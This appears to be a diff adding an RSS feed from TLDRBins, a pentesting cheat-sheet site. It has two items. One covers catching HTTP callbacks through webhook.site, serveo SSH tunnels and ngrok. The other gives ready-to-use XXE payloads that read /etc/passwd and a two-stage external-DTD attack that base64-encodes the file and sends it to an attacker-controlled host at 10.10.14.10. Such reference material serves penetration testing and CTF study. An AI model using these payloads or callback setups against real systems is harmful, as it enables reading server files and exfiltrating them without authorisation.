@@ -1,0 +1,25 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Xxe on TLDRBins</title>
+    <link>https://tldrbins.github.io/@xxe/</link>
+    <description>Recent content in Xxe on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/@xxe/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Connection from Public Internet</title>
+      <link>https://tldrbins.github.io/connection_from_public_internet/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/connection_from_public_internet/</guid>
+      <description>Simply catch HTTP request webhook.site&#xA;Catch HTTP request and host a web server serveo.net # Start a local HTTP server python3 -m http.server 3000 # Redirect http request to localhost:3000 ssh -R 80:localhost:3000 serveo.net ngrok Download ngrok&#xA;ngrok http 80 Note: ngrok free will show a warning message and require user accpet to proceed Note: Not good for XSS</description>
+    </item>
+    <item>
+      <title>XXE (XML External Entity)</title>
+      <link>https://tldrbins.github.io/xxe/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/xxe/</guid>
+      <description> XXE Template &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE foo [&amp;lt;!ENTITY data SYSTEM &amp;#34;/etc/passwd&amp;#34;&amp;gt;]&amp;gt; &amp;lt;product&amp;gt; &amp;lt;id&amp;gt;&amp;amp;data;&amp;lt;/id&amp;gt; &amp;lt;price&amp;gt;&amp;lt;/price&amp;gt; &amp;lt;/product&amp;gt; External DTD (2 stage) &amp;lt;!ENTITY % data SYSTEM &amp;#34;php://filter/convert.base64-encode/resource=/etc/passwd&amp;#34;&amp;gt; &amp;lt;!ENTITY % eval &amp;#34;&amp;lt;!ENTITY exfil SYSTEM &amp;#39;http://10.10.14.10/data?%data;&amp;#39;&amp;gt;&amp;#34;&amp;gt; &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY % bar SYSTEM &amp;#34;http://10.10.14.10/evil.dtd&amp;#34;&amp;gt; %bar; %eval; ]&amp;gt; &amp;lt;product&amp;gt; &amp;lt;id&amp;gt;&amp;amp;exfil;&amp;lt;/id&amp;gt; &amp;lt;price&amp;gt;&amp;lt;/price&amp;gt; &amp;lt;/product&amp;gt; </description>
+    </item>
+  </channel>
+</rss>
